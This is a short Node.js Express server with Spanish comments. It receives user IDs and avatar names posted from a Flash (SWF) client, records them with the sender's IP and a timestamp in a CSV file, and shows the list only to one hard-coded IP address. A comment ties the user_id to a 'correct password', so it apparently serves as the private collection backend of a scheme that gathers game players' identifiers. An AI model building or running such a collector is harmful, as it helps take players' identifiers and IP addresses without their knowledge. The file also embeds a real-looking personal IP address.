const express = require("express"); const fs = require("fs"); const app = express(); let lastUser = ""; // 📂 Servir archivos estáticos (por si lo necesitas) app.use(express.static("public")); // Middleware para aceptar JSON y formularios normales app.use(express.urlencoded({ extended: false })); app.use(express.json()); // 📩 Endpoint que recibe datos del SWF app.post("/recibir", (req, res) => { let user_id = ""; let user_name = ""; let testType = ""; // Detectar tipo de contenido if (req.is("application/json")) { user_id = (req.body.user_id || "").toString().trim(); user_name = (req.body.User || "").toString().trim(); testType = (req.body.TEST || "").toString().trim(); } else if (req.is("application/x-www-form-urlencoded")) { user_id = (req.body.user_id || "").toString().trim(); user_name = (req.body.User || "").toString().trim(); testType = (req.body.TEST || "").toString().trim(); } else { user_id = req.body?.user_id ? req.body.user_id.toString().trim() : ""; user_name = req.body?.User ? req.body.User.toString().trim() : ""; testType = req.body?.TEST ? req.body.TEST.toString().trim() : ""; } // 🌐 Obtener IP desde donde se recibió la info const clientIp = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "") .split(",")[0] .trim() .replace(/^.*:/, ""); // Si vino un User (nombre del keko), lo recordamos if (user_name) { lastUser = user_name; console.log(🧠 Guardado último User: ${lastUser}); } // Si vino un user_id (contraseña correcta), lo guardamos junto a IP y User if (user_id) { const cleanId = user_id.replace(/[^\w\-@\.]/g, ""); const cleanUser = lastUser ? lastUser.replace(/[^\w\s\-@\.]/g, "") : "-"; const cleanTest = testType ? testType.replace(/[^\w\s\-@\.]/g, "") : "-"; const now = new Date(); const fechaFormateada = ${now.getFullYear()}/${String( now.getMonth() + 1 ).padStart(2, "0")}/${String(now.getDate()).padStart(2, "0")} ${String( now.getHours() ).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String( now.getSeconds() ).padStart(2, "0")}; // 🔹 Ahora incluye también la columna TEST const line = ${fechaFormateada},${clientIp},${cleanId},${cleanUser},${cleanTest}\n; fs.appendFileSync("ids_store.csv", line, { flag: "a" }); console.log(✅ Guardado: ${cleanId} (${cleanUser}) [${cleanTest}] desde ${clientIp}); res.send("OK"); return; } res.status(400).send("Sin datos válidos"); }); // 🔒 Solo tu IP puede acceder a /lista app.get("/lista", (req, res, next) => { const clientIp = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "") .split(",")[0] .trim() .replace(/^.*:/, ""); const allowedIp = "188.77.187.80"; if (clientIp === allowedIp) { next(); // ✅ IP permitida } else { console.warn(🚫 Acceso denegado desde IP: ${clientIp}); res.status(403).send("Acceso denegado"); } }); // 📄 Mostrar lista guardada app.get("/lista", (req, res) => { const file = "ids_store.csv"; if (!fs.existsSync(file)) { res.send( <html> <head><title>Lista vacía</title></head> <body style="font-family:sans-serif; text-align:center;"> <h2>No hay datos todavía 📭</h2> </body> </html> ); return; } const contenido = fs.readFileSync(file, "utf8").trim().split("\n"); let filas = contenido .map((line) => { const [fecha, ip, id, user, test] = line.split(","); return <tr><td>${fecha}</td><td>${ip}</td><td>${id}</td><td>${user}</td><td>${test}</td></tr>; }) .join(""); res.setHeader("Content-Type", "text/html; charset=utf-8"); res.send( <html> <head> <title>Lista de user_id</title> <style> body { font-family: sans-serif; margin: 40px; background: #fafafa; color: #333; } table { border-collapse: collapse; width: 100%; max-width: 900px; margin: auto; } th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; } th { background: #f0f0f0; } h2 { text-align: center; } </style> </head> <body> <h2>📋 Lista de registros recibidos</h2> <table> <tr><th>Fecha</th><th>IP</th><th>User ID</th><th>User</th><th>TEST</th></tr> ${filas} </table> </body> </html> ); }); // 🚀 Iniciar servidor const PORT = process.env.PORT || 10000; app.listen(PORT, () => console.log(Servidor escuchando en puerto ${PORT}));
